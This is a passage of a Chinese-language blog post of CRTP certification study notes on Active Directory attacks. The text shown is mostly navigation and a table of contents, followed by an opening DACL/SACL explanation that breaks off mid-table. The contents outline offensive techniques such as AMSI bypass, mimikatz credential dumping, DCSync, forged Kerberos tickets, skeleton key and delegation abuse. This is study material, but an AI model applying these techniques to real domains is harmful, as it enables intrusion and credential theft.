href="/tags/%E5%AE%9E%E4%BE%8B%E8%AE%B0%E5%BD%95/" rel="tag">实例记录</a></li></ul>
    </div>
  </div>


  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Categories</h3>
      <div class="category-box">
            <a class="category-link" href="/categories/cloud/">
                cloud
                <div class="category-count">8</div>
            </a>
        
            <a class="category-link" href="/categories/forensic/">
                forensic
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/categories/AD/">
                AD
                <div class="category-count">11</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-5/">
                htb-Season-5
                <div class="category-count">7</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-6/">
                htb-Season-6
                <div class="category-count">10</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-4/">
                htb-Season-4
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-7/">
                htb-Season-7
                <div class="category-count">9</div>
            </a>
        
            <a class="category-link" href="/categories/CVE/">
                CVE
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/categories/ctf/">
                ctf
                <div class="category-count">8</div>
            </a>
        
            <a class="category-link" href="/categories/Sherlocks/">
                Sherlocks
                <div class="category-count">1</div>
            </a>
        </div>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Recent Posts</h3>
      <ul>
        
          <a class="recent-link" href="/2025/04/22/box-wp-Scepter/" title="【season-7】 htb Scepter wp" >
            <div class="recent-link-text">
              【season-7】 htb Scepter wp
            </div>
          </a>
        
          <a class="recent-link" href="/2025/04/21/ActionOPs/" title="ActionOPs" >
            <div class="recent-link-text">
              ActionOPs
            </div>
          </a>
        
          <a class="recent-link" href="/2025/04/14/Kubernetes-IngressNightmare-1/" title="「IngressNightmareをめざす異世界泥頭車！一、serviceはなに？！」" >
            <div class="recent-link-text">
              「IngressNightmareをめざす異世界泥頭車！一、serviceはなに？！」
            </div>
          </a>
        
          <a class="recent-link" href="/2025/04/13/box-wp-Nocturnal/" title="【season-7】 htb Nocturnal wp" >
            <div class="recent-link-text">
              【season-7】 htb Nocturnal wp
            </div>
          </a>
        
          <a class="recent-link" href="/2025/04/04/box-wp-Haze/" title="【season-7】 htb Haze wp" >
            <div class="recent-link-text">
              【season-7】 htb Haze wp
            </div>
          </a>
        
      </ul>
    </div>
  </div>

    
  </div> 
</sidebar>


    </div>
    
    <div id="toc" class="widget-wrap">
      <button class="toc-toggle" onclick="toggleTOC()">
    <span class="toc-toggle-icon">
        <i class="fa fa-chevron-down" aria-hidden="true"></i>
    </span>
</button>
<div id="tocContainer" style="display: block;">
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#01-DACL"><span class="toc-number">1.</span> <span class="toc-text">01 DACL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%94%A8%E6%88%B7%E5%A4%9A%E4%B8%AA%E6%9D%83%E9%99%90%E5%9C%BA%E6%99%AF%E7%9A%84DACL%E5%8C%B9%E9%85%8D"><span class="toc-number">1.1.</span> <span class="toc-text">1.用户多个权限场景的DACL匹配</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-ACL%E6%9D%83%E9%99%90%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">2.ACL权限利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9E%9A%E4%B8%BE%E6%94%B6%E9%9B%86%E5%9F%9F%E5%86%85ACL"><span class="toc-number">1.3.</span> <span class="toc-text">3.枚举收集域内ACL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-AdminSDHolder"><span class="toc-number">1.4.</span> <span class="toc-text">4.AdminSDHolder</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#01-%E5%88%A9%E7%94%A8AdminSD"><span class="toc-number">1.4.1.</span> <span class="toc-text">01.利用AdminSD</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#02-%E5%8A%A0%E8%BD%BD%E8%84%9A%E6%9C%AC%E6%89%8B%E5%8A%A8%E8%A7%A6%E5%8F%91adminSD%E5%90%8C%E6%AD%A5"><span class="toc-number">1.4.2.</span> <span class="toc-text">02.加载脚本手动触发adminSD同步</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#03-%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83"><span class="toc-number">1.4.3.</span> <span class="toc-text">03.如何防范</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9%E3%80%81%E6%B7%BB%E5%8A%A0%E7%AD%89%EF%BC%88%E5%91%BD%E4%BB%A4%E6%A0%B7%E4%BE%8B%EF%BC%89"><span class="toc-number">1.5.</span> <span class="toc-text">5.权限修改、添加等（命令样例）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%9F%BA%E4%BA%8EACL%E5%88%A9%E7%94%A8%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">1.6.</span> <span class="toc-text">6.基于ACL利用的访问持久化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#WMI%E7%9A%84ACL%E4%BF%AE%E6%94%B9"><span class="toc-number">1.6.1.</span> <span class="toc-text">WMI的ACL修改</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Powershell%E8%BF%9C%E7%A8%8B%E7%9A%84ACL%E4%BF%AE%E6%94%B9"><span class="toc-number">1.6.2.</span> <span class="toc-text">Powershell远程的ACL修改</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%9D%83%E9%99%90"><span class="toc-number">1.6.3.</span> <span class="toc-text">远程注册表权限</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#02-domain-enumeration"><span class="toc-number">2.</span> <span class="toc-text">02 domain enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8F%AF%E8%83%BD%E4%BC%9A%E6%9C%89%E5%9F%9F%E7%94%A8%E6%88%B7%E7%9A%84-description%EF%BC%88%E6%8F%8F%E8%BF%B0%EF%BC%89%E5%B1%9E%E6%80%A7%E8%A2%AB%E5%86%99%E4%BA%86%E6%98%8E%E6%96%87%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.</span> <span class="toc-text">1.可能会有域用户的 description（描述）属性被写了明文敏感信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%89%BE%E5%88%B0%E5%9F%9F%E5%86%85%E5%AE%9E%E9%99%85%E4%BD%BF%E7%94%A8%E7%9A%84%E6%9C%BA%E5%99%A8%EF%BC%8C%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E7%99%BB%E5%BD%95%E6%AC%A1%E6%95%B0%E6%9D%A5%E5%88%A4%E6%96%AD"><span class="toc-number">2.2.</span> <span class="toc-text">2.找到域内实际使用的机器，可以通过登录次数来判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9E%9A%E4%B8%BE%E7%BB%84"><span class="toc-number">2.3.</span> <span class="toc-text">3.枚举组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sid%E6%98%AF%E5%94%AF%E4%B8%80%E6%A0%87%E8%AF%86%EF%BC%8C%E6%97%A0%E6%B3%95%E5%87%BA%E7%8E%B0%E4%BF%A9%E7%9B%B8%E5%90%8C%E7%9A%84"><span class="toc-number">2.4.</span> <span class="toc-text">sid是唯一标识，无法出现俩相同的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E4%B8%80%E4%B8%AA%E5%9F%9F%E6%94%B6%E5%88%B0%E4%BA%86%E6%94%BB%E5%87%BB%EF%BC%8C%E6%95%B4%E4%B8%AA%E5%9F%9F%E6%9E%97%E6%97%A9%E6%99%9A%E9%83%BD%E4%BC%9AG%EF%BC%8C%EF%BC%88%E8%BF%99%E9%83%A8%E5%88%86%E5%86%85%E5%AE%B9%E5%B0%86%E4%BC%9A%E5%9C%A8-19-%E5%92%8C-20-%E8%8A%82%E8%AF%BE%E4%B8%AD%E5%AD%A6%E5%88%B0%EF%BC%89"><span class="toc-number">2.5.</span> <span class="toc-text">如果一个域收到了攻击，整个域林早晚都会G，（这部分内容将会在 19 和 20 节课中学到）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%9E%9A%E4%B8%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E7%BB%84%E4%BA%BA%E5%91%98"><span class="toc-number">2.6.</span> <span class="toc-text">4.枚举域管理员组人员</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E9%80%9A%E8%BF%87%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE%E7%94%A8%E6%88%B7%E6%89%80%E5%B1%9E%E7%BB%84"><span class="toc-number">2.7.</span> <span class="toc-text">5.通过用户名枚举用户所属组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%88%97%E5%87%BA%E6%9C%AC%E5%9C%B0-%E7%BB%84-%E6%88%96-%E7%BB%84%E6%88%90%E5%91%98"><span class="toc-number">2.8.</span> <span class="toc-text">6.列出本地 组 或 组成员</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E6%9E%9A%E4%B8%BE-smbshare"><span class="toc-number">2.9.</span> <span class="toc-text">7.枚举 smbshare</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-bloodhound%E9%81%9B%E7%8B%97"><span class="toc-number">2.10.</span> <span class="toc-text">8.bloodhound遛狗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-SOAPHound"><span class="toc-number">2.11.</span> <span class="toc-text">9.SOAPHound</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E5%9F%9F%E4%BC%9A%E8%AF%9D%EF%BC%88session%EF%BC%89%E6%9E%9A%E4%B8%BE"><span class="toc-number">2.12.</span> <span class="toc-text">10.域会话（session）枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E7%94%A8%E6%88%B7%E8%A2%AB%E9%85%8D%E7%BD%AE%E4%B8%BA%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98-%E6%9E%9A%E4%B8%BE"><span class="toc-number">2.13.</span> <span class="toc-text">11.用户被配置为本地管理员 枚举</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#03-powershell"><span class="toc-number">3.</span> <span class="toc-text">03 powershell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass-amsi"><span class="toc-number">3.1.</span> <span class="toc-text">bypass amsi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E6%A8%A1%E5%9D%97"><span class="toc-number">3.2.</span> <span class="toc-text">加载模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%97%E5%87%BA%E6%A8%A1%E5%9D%97%E4%B8%AD%E5%8F%AF%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">3.3.</span> <span class="toc-text">列出模块中可用的命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell-%E4%B8%8B%E8%BD%BD"><span class="toc-number">3.4.</span> <span class="toc-text">powershell 下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell-%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%BC%8F"><span class="toc-number">3.5.</span> <span class="toc-text">powershell 语言模式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#applocker"><span class="toc-number">3.5.1.</span> <span class="toc-text">applocker</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC%E5%8F%97%E9%99%90"><span class="toc-number">3.6.</span> <span class="toc-text">powershell执行脚本受限</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OPSEC"><span class="toc-number">4.</span> <span class="toc-text">OPSEC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E7%A5%A8%E6%8D%AE"><span class="toc-number">4.1.</span> <span class="toc-text">域票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E7%94%A8%E6%88%B7"><span class="toc-number">4.2.</span> <span class="toc-text">域用户</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#04-GPO-OU"><span class="toc-number">5.</span> <span class="toc-text">04 GPO,OU</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GPO"><span class="toc-number">5.1.</span> <span class="toc-text">GPO</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OU"><span class="toc-number">5.2.</span> <span class="toc-text">OU</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%97%E9%99%90%E7%BB%84"><span class="toc-number">5.3.</span> <span class="toc-text">受限组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GPO%E6%BB%A5%E7%94%A8"><span class="toc-number">5.4.</span> <span class="toc-text">GPO滥用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#05-Domian-Trusts"><span class="toc-number">6.</span> <span class="toc-text">05 Domian Trusts</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%96%E9%83%A8%E4%BF%A1%E4%BB%BB"><span class="toc-number">6.1.</span> <span class="toc-text">外部信任</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Forest-Trusts"><span class="toc-number">6.2.</span> <span class="toc-text">Forest Trusts</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E5%9F%9F%E5%90%8D%E4%BF%A1%E4%BB%BB"><span class="toc-number">6.3.</span> <span class="toc-text">枚举域名信任</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE-Forest"><span class="toc-number">6.4.</span> <span class="toc-text">枚举 Forest</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%8C%87%E5%AE%9A%E5%9F%9F%E6%9E%97%E4%B8%AD%E7%9A%84%E5%9F%9F"><span class="toc-number">6.5.</span> <span class="toc-text">获取指定域林中的域</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%97%E5%87%BA%E6%9E%97%E4%B8%AD%E7%9A%84%E5%85%A8%E5%B1%80%E7%BC%96%E5%BD%95%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E6%9E%9A%E4%B8%BE%E4%BD%9C%E4%B8%BA%E5%85%A8%E5%B1%80%E7%9B%AE%E5%BD%95%E7%9A%84DC%E6%8E%A7%E5%88%B6%E5%99%A8%EF%BC%89"><span class="toc-number">6.6.</span> <span class="toc-text">列出林中的全局编录服务器（枚举作为全局目录的DC控制器）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E5%9F%9F%E6%9E%97%E4%B9%8B%E9%97%B4%E4%BF%A1%E4%BB%BB"><span class="toc-number">6.7.</span> <span class="toc-text">枚举域林之间信任</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#06-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Privilege-Escalation"><span class="toc-number">7.</span> <span class="toc-text">06 权限提升(Privilege Escalation)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%BC%BA%E9%99%B7%E6%9C%8D%E5%8A%A1%E6%9E%9A%E4%B8%BE"><span class="toc-number">7.1.</span> <span class="toc-text">1.缺陷服务枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9C%AC%E8%BA%AB%E5%B0%B1%E6%98%93%E5%8F%97%E6%94%BB%E5%87%BB%E7%9A%84%E9%AB%98%E6%9D%83%E6%9C%8D%E5%8A%A1"><span class="toc-number">7.2.</span> <span class="toc-text">2.本身就易受攻击的高权服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-NTLM-KRB%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB"><span class="toc-number">7.3.</span> <span class="toc-text">3.NTLM&#x2F;KRB中继攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#07-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">8.</span> <span class="toc-text">07 横向移动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#08-%E7%9B%B8%E5%85%B3%E6%95%8F%E6%84%9F%E5%87%AD%E6%8D%AE%E6%8F%90%E5%8F%96"><span class="toc-number">9.</span> <span class="toc-text">08 相关敏感凭据提取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mimikatz"><span class="toc-number">9.1.</span> <span class="toc-text">mimikatz</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DC%E4%B8%ADdump%E6%89%80%E6%9C%89%E5%9F%9F%E5%87%AD%E6%8D%AE"><span class="toc-number">9.1.1.</span> <span class="toc-text">DC中dump所有域凭据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dump%E5%87%AD%E6%8D%AE-dump-credentials"><span class="toc-number">9.1.2.</span> <span class="toc-text">dump凭据 dump credentials</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92-pth"><span class="toc-number">9.1.3.</span> <span class="toc-text">哈希传递(pth)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DCSync"><span class="toc-number">9.1.4.</span> <span class="toc-text">DCSync</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PS%E5%8E%86%E5%8F%B2%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95"><span class="toc-number">9.2.</span> <span class="toc-text">PS历史命令记录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8"><span class="toc-number">9.2.1.</span> <span class="toc-text">票据利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#09-kerberos"><span class="toc-number">10.</span> <span class="toc-text">09 kerberos</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-PAC"><span class="toc-number">10.1.</span> <span class="toc-text">1.PAC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Golden-Ticket"><span class="toc-number">10.2.</span> <span class="toc-text">2.Golden Ticket</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%87%91%E7%A5%A8%EF%BC%9A"><span class="toc-number">10.2.1.</span> <span class="toc-text">利用金票：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-sliver-Ticket"><span class="toc-number">10.3.</span> <span class="toc-text">3.sliver Ticket</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8%E9%93%B6%E7%A5%A8"><span class="toc-number">10.3.1.</span> <span class="toc-text">1.利用银票</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Diamond-Ticket"><span class="toc-number">10.4.</span> <span class="toc-text">4.Diamond Ticket</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8%E9%92%BB%E7%9F%B3%E7%A5%A8"><span class="toc-number">10.4.1.</span> <span class="toc-text">1.利用钻石票</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Skeleton-key"><span class="toc-number">10.5.</span> <span class="toc-text">5.Skeleton key</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%B3%A8%E5%85%A5%E4%B8%87%E8%83%BD%E9%92%A5%E5%8C%99"><span class="toc-number">10.5.1.</span> <span class="toc-text">1.注入万能钥匙</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-DSRM"><span class="toc-number">10.6.</span> <span class="toc-text">6.DSRM</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%8E%B7%E5%8F%96DSRM%E5%87%AD%E6%8D%AE"><span class="toc-number">10.6.1.</span> <span class="toc-text">1.获取DSRM凭据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8DSRM%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7"><span class="toc-number">10.6.2.</span> <span class="toc-text">2.利用DSRM管理员账户</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-Custom-SSP"><span class="toc-number">10.7.</span> <span class="toc-text">7.Custom SSP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">10.7.1.</span> <span class="toc-text">1.利用方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-kerberoasting"><span class="toc-number">10.8.</span> <span class="toc-text">8.kerberoasting</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-SPN"><span class="toc-number">10.8.1.</span> <span class="toc-text">1.SPN</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">10.8.1.1.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-AS-REProast"><span class="toc-number">10.8.2.</span> <span class="toc-text">2.AS-REProast</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-number">10.8.2.1.</span> <span class="toc-text">利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-Kerberos-Delegation-%EF%BC%88%E5%A7%94%E6%B4%BE%EF%BC%89"><span class="toc-number">10.9.</span> <span class="toc-text">9.Kerberos Delegation （委派）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%97%A0%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-Unconstrained-Delegation"><span class="toc-number">10.9.1.</span> <span class="toc-text">1.无约束委派 Unconstrained Delegation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%9E%9A%E4%B8%BE"><span class="toc-number">10.9.1.1.</span> <span class="toc-text">1.枚举</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8"><span class="toc-number">10.9.1.2.</span> <span class="toc-text">2.利用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-Constrained-Delegation"><span class="toc-number">10.9.2.</span> <span class="toc-text">2.约束委派 Constrained Delegation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#S4U2Self"><span class="toc-number">10.9.2.1.</span> <span class="toc-text">S4U2Self</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#S4U4Proxy"><span class="toc-number">10.9.2.2.</span> <span class="toc-text">S4U4Proxy</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%AF%BB%E6%89%BE%E5%90%AF%E7%94%A8%E4%BA%86%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E7%94%A8%E6%88%B7%E6%88%96%E6%9C%BA%E5%99%A8"><span class="toc-number">10.9.2.3.</span> <span class="toc-text">1.寻找启用了约束委派的用户或机器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8-S4U2Self-S4U2Proxy-%E8%AE%BF%E9%97%AE%E6%9C%8D%E5%8A%A1"><span class="toc-number">10.9.2.4.</span> <span class="toc-text">2.利用 S4U2Self + S4U2Proxy 访问服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8D%E7%A7%B0%E4%B8%8D%E5%8F%98-%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9S4U2proxy%E8%AF%B7%E6%B1%82%E5%9B%9E%E6%9D%A5%E7%9A%84%E7%A5%A8%E6%8D%AE%E4%B8%AD%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%A5%E8%AE%BF%E9%97%AE%E9%AB%98%E4%BB%B7%E5%80%BC%E6%9C%8D%E5%8A%A1"><span class="toc-number">10.9.2.5.</span> <span class="toc-text">3.服务器名称不变 通过修改S4U2proxy请求回来的票据中的服务来访问高价值服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E5%88%A9%E7%94%A8-S4U2Self-%E4%BC%AA%E9%80%A0%E9%AB%98%E6%9D%83%E7%94%A8%E6%88%B7%E4%BF%AE%E6%94%B9%E5%BD%93%E5%89%8D%E6%9C%8D%E5%8A%A1%E8%B4%A6%E6%88%B7ms-AllowedToDelegateTo%E5%B1%9E%E6%80%A7%E6%8C%87%E5%90%91%E9%AB%98%E4%BB%B7%E5%80%BC%E6%9C%BA%E5%99%A8%E6%9C%8D%E5%8A%A1"><span class="toc-number">10.9.2.6.</span> <span class="toc-text">4. 利用 S4U2Self 伪造高权用户修改当前服务账户ms-AllowedToDelegateTo属性指向高价值机器服务</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-RBCD"><span class="toc-number">10.9.3.</span> <span class="toc-text">3.基于资源的约束委派 RBCD</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8%E7%82%B9"><span class="toc-number">10.9.3.1.</span> <span class="toc-text">1.利用点</span></a></li></ol></li></ol></li></ol></li></ol>
</div>
<script>
    function toggleTOC() {
        const tocContainer = document.getElementById('tocContainer');
        const icon = document.querySelector('.toc-toggle-icon i');
        const isHidden = tocContainer.style.display === 'none';
        tocContainer.style.display = isHidden ? 'block' : 'none';
        icon.className = isHidden ? 'fa fa-chevron-up' : 'fa fa-chevron-down';
    }
</script>
<style>
    .toc-toggle {
        position: relative;
        display: inline-block;
        padding: 5px;
        border: 1px solid #ccc;
        border-radius: 50%;
        background-color: #f5f5f5;
        cursor: pointer;
        transition: all 0.2s ease;
    }

    .toc-toggle:hover {
        background-color: #e5e5e5;
    }

    .toc-toggle-icon {
        display: inline-block;
        vertical-align: middle;
    }

    .toc-toggle-icon i {
        font-size: 16px;
        transition: transform 0.2s ease;
    }

    #tocContainer {
        display: block;
        margin-top: 10px;
    }
</style>


    </div>
    
    <div id="content-body">
       


<article id="post-crtp-study-note" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
<div class="article-gallery">
  <div class="article-gallery-photos">
    
      <a class="article-gallery-img" rel="gallery_cmav3o5y7005e7sky4opec9y0">
        <img src="/wpimages/2025/crtp-study-note/background.jpg" itemprop="image">
      </a>
    
  </div>
</div>

   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        crtp-study-note
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2024-12-20T11:40:41.000Z" itemprop="datePublished">2024-12-20</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
    Uncategorized 
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            32k words 
          </div>
        </div>
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/AD/" rel="tag">AD</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/crtp/" rel="tag">crtp</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/note/" rel="tag">note</a></li></ul>

      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <h2 id="01-DACL"><a href="#01-DACL" class="headerlink" title="01 DACL"></a>01 DACL</h2><p>acl分为两种类型，<code>DACL</code> 和 <code>SACL</code></p>
<p>DACL</p>
<ul>
<li>控制访问权限</li>
<li>ACE包含（拒绝访问&#x2F;允许）</li>
<li>直接决定权限</li>
</ul>
<p>SACL</p>
<ul>
<li>日志&#x2F;审计记录</li>
<li>行为记录</li>
<li>失败&#x2F;成功的行为记录</li>
</ul>
<h3 id="1-用户多个权限场景的DACL匹配"><a href="#1-用户多个权限场景的DACL匹配" class="headerlink" title="1.用户多个权限场景的DACL匹配"></a>1.用户多个权限场景的DACL匹配</h3><p>以下为例，当有两个 <code>用户A</code> <code>用户B</code> </p>
<table>
<thead>
<tr>
<th>A用户</th>
<th>B用户</th>
</tr>
</thead>
<tbody><tr>
<td>Andrew</td>
<td>Jane</td>
</tr>
<tr>
